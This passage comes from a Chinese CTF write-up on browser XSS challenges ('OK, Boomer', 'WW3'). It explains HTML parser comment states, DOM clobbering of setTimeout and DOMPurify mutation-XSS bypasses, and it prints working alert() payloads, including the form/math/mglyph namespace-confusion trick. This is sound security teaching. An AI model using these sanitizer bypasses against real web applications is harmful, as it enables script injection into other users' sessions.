class=\"line\">aaa&lt;!--?b--&gt;</span><br><span class=\"line\">aaa&lt;!--?bb--&gt;</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;c</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;cc</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;ccc</span><br><span class=\"line\">直到该状态遇到了&gt;为止，回到 data state。注意这个 Bogus comment state 解析到&gt;的时候会直接回到 data state，也就是 HTML parser 最开始解析的状态，这个时候我们就可以插入 HTML 代码了。</span><br><span class=\"line\"></span><br><span class=\"line\">我们输入payload后：?debug=aaa&lt;?bbb&gt;ccc&lt;svg%20onload=alert(1)&gt;</span><br><span class=\"line\">首先aaa&lt;?bbb&gt;ccc 变为 aaa&lt;!--?bbb--&gt; ccc</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;aaa&lt;!--?bbb--&gt;</span><br><span class=\"line\">&quot;ccc&quot;</span><br><span class=\"line\">&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;/svg&gt;</span><br><span class=\"line\">成功闭合注释</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果题目没有过滤&amp;#时，存在unintended solution</span><br><span class=\"line\">payload:</span><br><span class=\"line\">&lt;img title=&quot;&amp;#x2D;&amp;#x2D;&amp;#x3E;&amp;#x3C;&amp;#x73;&amp;#x76;&amp;#x67;&amp;#x2F;&amp;#x6F;&amp;#x6E;&amp;#x6C;&amp;#x6F;&amp;#x61;&amp;#x64;&amp;#x3D;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;1&amp;#x29;&amp;#x3E;&quot;&gt;1</span><br><span class=\"line\"></span><br><span class=\"line\">我们可以用html实体编码闭合多行注释</span><br><span class=\"line\">但：简单的--&gt;; 并不能闭合,因为第一次的innerHTML会将&gt;进行编码为实体，第二次innerhtml时传入的是--&amp;gt;不能闭合</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class=\"line\">但img标签中title可以绕过，因为第一次HTML parser不会将 title 属性内的字符串进行转义</span><br><span class=\"line\">&lt;svg&gt;&lt;b title=&quot;--&gt;&lt;svg/onload=alert()&gt;&quot;&gt;aaa</span><br><span class=\"line\">最终在html中渲染的是</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=&quot;--&gt;&lt;svg onload=&quot;alert()&quot;&gt;&quot;&amp;gt;1 &lt;/svg&gt;&lt;p&gt;&lt;/p&gt; --&amp;gt;</span><br><span class=\"line\">然后当 HTML parser 解析这段代码时，首先由&lt;!的存在，会进入[Markup declaration open state]，中间的代码&lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=”会让 HTML parser 进入一些其他关于 comment 的状态，这些都无关紧要，最后的–&gt;让 HTML parser 进入到了[Comment End State]</span><br></pre></td></tr></table></figure>\n<h2 id=\"okboomer\"><a class=\"markdownIt-Anchor\" href=\"#okboomer\">#</a> OK，Boomer</h2>\n<p><strong>前置知识：</strong></p>\n<p>1.DOM 中内容会影响 Windows</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;btn&quot;</span>&gt;</span>click me<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"variable language_\">window</span>.<span class=\"property\">btn</span>)  <span class=\"comment\">//&lt;button id=&quot;btn&quot;&gt;click me&lt;/button&gt;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>只需要用 id 同名就可以拿到 html 元素</p>\n<p>也就是说除了  <code>id</code>  可以直接用  <code>window</code>  存取， <code>embed</code> ,  <code>form</code> ,  <code>img</code>  和  <code>object</code>  这四个标签用  <code>name</code>  也可以操作：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">embed</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;a&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">embed</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;b&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;c&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">object</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;d&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">object</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"variable language_\">window</span>.<span class=\"property\">c</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>通过 html 影响 js</p>\n<p>1) 利用 html 标签的属性 id，很容易在 window 对象上创建任意的属性，但是我们能在新对象上创建新属性吗？</p>\n<p>2) 怎么控制 DOM elements 被强制转为 string 之后的值，大多数的 dom 节点被转为 string 后是 [object HTMLInputElement]。</p>\n<p>关于问题 1)</p>\n<p>最常引用的解决方法是使用 <code>&lt;form&gt;</code>  标签。标记的每个 <code>&lt;input&gt;</code>  都属于 <code>&lt;form&gt;</code>  后代，该属性 <code>&lt;form&gt;</code>  引用 <code>name</code>  属性可以取到 <code>&lt;input&gt;</code> 。考虑以下示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=test1&gt;</span><br><span class=\"line\">  &lt;input name=test2&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  alert(test1.test2); // alerts &quot;[object HTMLInputElement]&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>可以通过 name 取值，但取到的值是对象，即引出问题 2)</p>\n<p>js 内部会执行两个方法 tovalue,tostring，因为 js 的原型链</p>\n<p>一般来说，对象的 <code>valueof</code>  方法总是返回对象自身，这时再自动调用对象的 <code>tostring</code>  方法，将其转为字符串。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123; p: 1 &#125;;</span><br><span class=\"line\">obj.valueof().tostring() // &quot;[object object]&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>对象的 <code>tostring</code>  方法默认返回 <code>[object object]</code> ，所以就得到了最前面那个例子的结果。</p>\n<p>通过遍历 HTML 中所有可能的元素并检查它们的 <code>toString</code>  方法是否继承自 <code>Object.prototype</code>  或以另一种方式定义</p>\n<p>一个简短的 JS 代码，它遍历 HTML 中所有可能的元素并检查它们的 <code>toString</code>  方法是否继承自 <code>Object.prototype</code>  或以另一种方式定义。如果它们不继承自 <code>Object.prototype</code> ，那么可能 <code>[object SomeElement]</code>  会返回其他东西。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.getOwnPropertyNames(window)   //获取Window下object所有属性</span><br><span class=\"line\">.filter(p =&gt; p.match(/Element$/))   //匹配以element结尾的属性</span><br><span class=\"line\">.map(p =&gt; window[p])</span><br><span class=\"line\">.filter(p =&gt; p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== Object.prototype.toString)  //找到不继承object的tostring的元素</span><br></pre></td></tr></table></figure>\n<p>得到结果 <code>HTMLAreaElement</code> （ <code>&lt;area&gt;</code> ）和 <code>HTMLAnchorElement</code> （ <code>&lt;a&gt;</code> ）这两个元素不继承 tostring 方法</p>\n<p>在 <code>&lt;a&gt;</code>  元素的情况下， <code>toString</code>  只返回一个 <code>href</code>  属性值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=test1 href=https://securitum.com&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  alert(test1); // alerts &quot;https://securitum.com&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>由于没有继承 tostring 导致弹出的不再是 object htmlinputelement，a 标签可以控制弹出的内容</p>\n<p>但是以下代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (window.test1.test2) &#123;</span><br><span class=\"line\">    eval(&#x27;&#x27;+window.test1.test2)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>执行结果为 undefined</p>\n<p>假设有两个 id 一样的元素</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=test1&gt;click!&lt;/a&gt;</span><br><span class=\"line\">&lt;a id=test1&gt;click2!&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<p>通过 id 取值，得到 htmlcollection，htmlcollection 可以通过索引取值， <code>window.test1.test1</code>  实际上是指第一个元素，但无法取到第二个元素</p>\n<p>如果想取到第二个元素，需要给第二个元素加 name 值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=test1&gt;click!&lt;/a&gt;</span><br><span class=\"line\">&lt;a id=test1 name=test2&gt;click2!&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<p>我们可以通过 name 访问第二个 a <code>window.test1.test2</code></p>\n<p>通过给第二个 a 加 href 控制弹出内容</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test1&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test1&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;test2&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;x:alert(1)&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>但 x 不是标准协议，需要使用协议比如 <code>tel,mailto,cid,javascript</code>  等</p>\n<p>即：需要有两个 a 标签，且需要通过 name 去到第二个 a 标签</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM3MTA2MTUwNzQtNzAwNGY1NGUtM2YyMy00NTc0LWJhYWYtMTk0MTI3MzEyZjIwLm1k\">📎Ok, Boomer.md</span></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;boomer&quot;</span>&gt;</span>Ok, Boomer.<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    boomer.<span class=\"property\">innerHTML</span> = <span class=\"title class_\">DOMPurify</span>.<span class=\"title function_\">sanitize</span>(<span class=\"keyword\">new</span> <span class=\"title function_\">URL</span>(location).<span class=\"property\">searchParams</span>.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;boomer&#x27;</span>) || <span class=\"string\">&quot;Ok, Boomer&quot;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"built_in\">setTimeout</span>(ok, <span class=\"number\">2000</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>setTimeout (ok, 2000) 中的 ok 可以接收一个函数或者字符串，如果我们能够向 ok 这个变量注入可执行的 payload，那么也就能成功弹框</p>\n<p>可以使用 DOM Clobbering 的方式，通过向 HTML 注入 DOM 元素，来实现操作 JavaScript 变量</p>\n<p>首先，要构造一个变量 ok，我们可以通过创建一个 id=ok 的 DOM 元素来实现，比如<div id=\"ok\"></div></p>\n<p>然后，ok 需要接受一个字符串作为值，而在对<a>标签调用 toString () 方法时，会返回属性 href 的值，所以，我们可以选择<a>标签作为构造对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?boomer=&lt;a id=ok href=cid:alert(1337)&gt;</span><br></pre></td></tr></table></figure>\n<p>href 的值要遵守 protocol:uri 的格式，然而，在 href 里直接使用 javascript: 协议是不行的</p>\n<p>通过查看 DOMPurify 的源码可以发现，它支持的合法的协议 有 mailto, tel, xmpp 等等，随便选择一个即可</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?boomer=&lt;a%20id=ok%20href=mailto:alert(1337)&gt;</span><br><span class=\"line\">?boomer=&lt;a%20id=ok%20href=tel:alert(1337)&gt;</span><br></pre></td></tr></table></figure>\n<p>由于劫持了 settimeout，因此会延迟两秒执行</p>\n<p>通过两个 id 可以取到的标签：</p>\n<p>form,button</p>\n<p>form,fieldset</p>\n<p>form,image</p>\n<p>form,img</p>\n<p>form,input</p>\n<p>form,object</p>\n<p>form,output</p>\n<p>form,select</p>\n<p>form,textarea</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=x&gt;</span><br><span class=\"line\">\t&lt;img id=y&gt;</span><br><span class=\"line\">console.log(x.y)  //&lt;img id=y&gt;</span><br></pre></td></tr></table></figure>\n<p>通过三层嵌套取到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=x&gt;</span><br><span class=\"line\">&lt;form id=x name=y&gt;</span><br><span class=\"line\">&lt;input id=z&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">window.x.y.z.value</span><br></pre></td></tr></table></figure>\n<p>unintended solution</p>\n<p>利用 html-svg-math 的命名空间混淆突变绕过 dompurify，要求 dompurify 版本 &lt; 2.0.7</p>\n<p>前置知识：</p>\n<p>1.DOMPurify 的典型用法使 HTML 标记被解析两次。</p>\n<p>dompurify 使用语句如下</p>\n<p><code>div.innerHTML = DOMPurify.sanitize(htmlMarkup)</code></p>\n<p>在解析和序列化 HTML 以及对 DOM 树的操作方面，在上面的简短片段中发生了以下操作：</p>\n<ol>\n<li><code>htmlMarkup</code>  <strong>被解析为 DOM 树</strong>。</li>\n<li>DOMPurify 清理 DOM 树（简而言之，该过程是遍历 DOM 树中的所有元素和属性，并删除所有不在允许列表中的节点）。</li>\n<li>DOM 树<strong>被序列化回 HTML 标记</strong>。</li>\n<li>分配给 后 <code>innerHTML</code> ，浏览器会<strong>再次解析 HTML 标记</strong>。</li>\n<li>解析后的 DOM 树被附加到文档的 DOM 树中。</li>\n</ol>\n<p>假设我们的初始 html 是 <code>A&lt;img src=1 onerror=alert(1)&gt;B</code> 。在第一步中，它被解析为以下树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-1-1536x155.png\" alt=\"\"></p>\n<p>然后，DOMPurify 对其进行清理，留下以下 DOM 树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-2-1536x161.png\" alt=\"\"></p>\n<p>然后它被序列化为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">A&lt;img src=&quot;1&quot;&gt;B</span><br></pre></td></tr></table></figure>\n<p>这就是 <code>DOMPurify.sanitize</code>  的返回值。然后浏览器在分配给 innerHTML 时再次解析：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-3-1536x161.png\" alt=\"\"></p>\n<p>DOM 树与 DOMPurify 处理的树相同，然后附加到文档中。</p>\n<p>所以附加到文档之前需要解析 - 序列化 - 解析。但<strong>两次解析的 DOM 树未必相同</strong>。</p>\n<p>2.HTML 规范有一个问题，它使得创建嵌套 <code>form</code>  元素成为可能。但是，在重新解析时，第二个 <code>form</code>  将消失。</p>\n<p>html 规范中，不允许 form 元素的子元素是 form。那么说明嵌套 form 元素是不被允许的。这会导致嵌套里面的 form 元素被 html 解析器忽略。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=form1&gt;</span><br><span class=\"line\">INSIDE_FORM1</span><br><span class=\"line\">&lt;form id=form2&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-5-1536x121.png\" alt=\"\"></p>\n<p>我们可以通过带有错误嵌套标签的稍微损坏的标记，可以创建嵌套表单。</p>\n<p><code>&lt;form id=&quot;outer&quot;&gt;&lt;div&gt;&lt;/form&gt;&lt;form id=&quot;inner&quot;&gt;&lt;input&gt;</code></p>\n<p>它产生以下 DOM 树，其中包含一个嵌套的表单元素：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-6-1536x211.png\" alt=\"\"></p>\n<p>这不是任何特定浏览器中的错误；它直接来自 HTML 规范，并在解析 HTML 的算法中进行了描述。这是一般的想法：</p>\n<ul>\n<li>当你打开一个 <code>&lt;form&gt;</code>  标签时，解析器需要使用<strong>表单元素指针</strong>打开的（在规范中是这样调用的）。如果指针不是 <code>null</code> ，则 <code>form</code>  无法创建元素。</li>\n<li>结束 <code>&lt;form&gt;</code>  标记时，表单元素指针始终设置为 <code>null</code> 。</li>\n</ul>\n<p>注意：一般来说子元素是要紧贴父元素的</p>\n<p>现在，如果我们尝试序列化生成的 DOM 树，我们将得到以下标记：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=&quot;outer&quot;&gt;&lt;div&gt;&lt;form id=&quot;inner&quot;&gt;&lt;input&gt;&lt;/form&gt;&lt;/div&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-7-1536x151.png\" alt=\"\"></p>\n<p>所以这证明了序列化后再次解析不能保证返回原始 DOM 树，同时再次解析后内层 form 消失了</p>\n<p>3. 外部内容</p>\n<p>HTML 解析器可以创建一个包含三个命名空间元素的 DOM 树：</p>\n<ul>\n<li>HTML 命名空间</li>\n<li>SVG 命名空间</li>\n<li>MathML 命名空间 ，是 XML 语言的子集 zhangxinxu</li>\n</ul>\n<p>默认情况下，所有元素都在 HTML 命名空间中；但是，如果解析器遇到 <code>&lt;svg&gt;</code> or <code>&lt;math&gt;</code>  元素，则它分别 “切换” 到 SVG 和 MathML 命名空间。并且这两个命名空间都会产生外部内容。</p>\n<p>在外部内容中，标记的解析方式与普通 HTML 不同。这可以在解析 <code>&lt;style&gt;</code>  元素时清楚地显示出来。在 HTML 命名空间中， <code>&lt;style&gt;</code>  只能包含文本；没有后代，并且不解码 HTML 实体。外部内容并非如此：外部内容 <code>&lt;style&gt;</code>  可以有子元素，并且实体被解码。</p>\n<p><code>&lt;style&gt;&lt;a&gt;ABC&lt;/style&gt;&lt;svg&gt;&lt;style&gt;&lt;a&gt;ABC</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-8-1536x308.png\" alt=\"\"></p>\n<p>证明了 svg 命名空间中的 style 可以被解析</p>\n<p>如果我们在里面 <code>&lt;svg&gt;</code> ， <code>&lt;math&gt;</code>  那么所有元素也都在非 HTML 命名空间中。但是这是错误的。HTML 规范中有一些元素称为<strong> MathML 文本集成点</strong>和<strong> HTML 集成点</strong>。这些元素的子元素具有 HTML 命名空间</p>\n<p><code>&lt;math&gt;&lt;style&gt;&lt;a&gt;A&lt;/style&gt;&lt;mtext&gt;&lt;style&gt;&lt;a&gt;B&lt;/style&gt;</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-9-1536x207.png\" alt=\"\"></p>\n<p>请注意 <code>style</code>  作为 math 的直接子元素 <code>在 MathML 命名空间中，而</code> 第二个 style <code>在mtext下则是 HTML 命名空间中。这是因为</code>  mtext` 是<strong> MathML 文本集成点</strong>并使解析器切换命名空间。</p>\n<p>MathML 文本集成点是：</p>\n<ul>\n<li><code>math mi</code></li>\n<li><code>math mo</code></li>\n<li><code>math mn</code></li>\n<li><code>math ms</code></li>\n</ul>\n<p>HTML 集成点是：</p>\n<ul>\n<li><code>math annotation-xml</code>  如果它有一个名为的属性， <code>encoding</code>  其值等于 <code>text/html</code>  或  <code>application/xhtml+xml</code></li>\n<li><code>svg foreignObject</code></li>\n<li><code>svg desc</code></li>\n<li><code>svg title</code></li>\n</ul>\n<p>但并不是所有 mathml 文本集成点和 html 集成点子元素都是 html 命名空间的</p>\n<p>html 规范中，大部分 Mathml 文本集成点的子元素都是 HTML 命名空间的啊，但是除了<mglyph><malignmark>。当这两直接是 Mathml 文本集成点的直接子元素的时候。他们不会切换命名空间。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-10-1536x252.png\" alt=\"\"></p>\n<p>最终 payload1:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>使用以上所有内容，我们可以创建一个包含两个 <code>form</code>  元素和 <code>mglyph</code>  元素的标记，该标记最初位于 HTML 命名空间中，但在重新解析它时位于 MathML 命名空间中，从而使后续 <code>style</code>  标记的解析方式不同并导致 XSS。</p>\n<p>payload 利用错误嵌套的 <code>html form</code>  元素，并且还包含 <code>mglyph</code>  元素。它生成以下 DOM 树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-11-1536x326.png\" alt=\"\"></p>\n<p>这个 DOM 树是无害的。所有元素都在 DOMPurify 的允许列表中。请注意，这 <code>mglyph</code>  是在 HTML 命名空间中。看起来像 XSS playload 的片段只是 <code>html style</code> . 因为有一个嵌套的 <code>html form</code> ，我们可以非常确定这个 DOM 树将在重新解析时发生变异。</p>\n<p>序列化之后的 html 是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;/form&gt;&lt;/mtext&gt;&lt;/math&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>\n<p>此代码段具有嵌套 <code>form</code>  标签。所以当它被赋值给 时 <code>innerHTML</code> ，它会被解析成下面的 DOM 树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-12-1536x312.png\" alt=\"\"></p>\n<p>所以现在第二个 <code>html form</code>  没有被创建， <code>mglyph</code>  现在是 mtext 的直接子元素，在 MathML 命名空间中。因此， <code>style</code>  它也在 MathML 命名空间中，因此其内容不被视为文本。然后 <code>&lt;/math&gt;</code>  关闭 <code>&lt;math&gt;</code>  元素，现在 <code>img</code>  在 HTML 命名空间中创建，导致 XSS。</p>\n<p>payload2:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;math&gt;&lt;table id=&quot;&lt;/table&gt;&quot;&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009104652050.png\" alt=\"image-20221009104652050\"></p>\n<p>经过二次解析后为</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009104805809.png\" alt=\"image-20221009104805809\"></p>\n<h2 id=\"ww3\"><a class=\"markdownIt-Anchor\" href=\"#ww3\">#</a> WW3</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4NzU4NTQ4MzQtY2RiMDQyYjAtMTUwYS00ZmIzLWIyM2UtMmFlMmI5Zjk5ZTU1Lm1k\">📎World War 3.md</span></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span 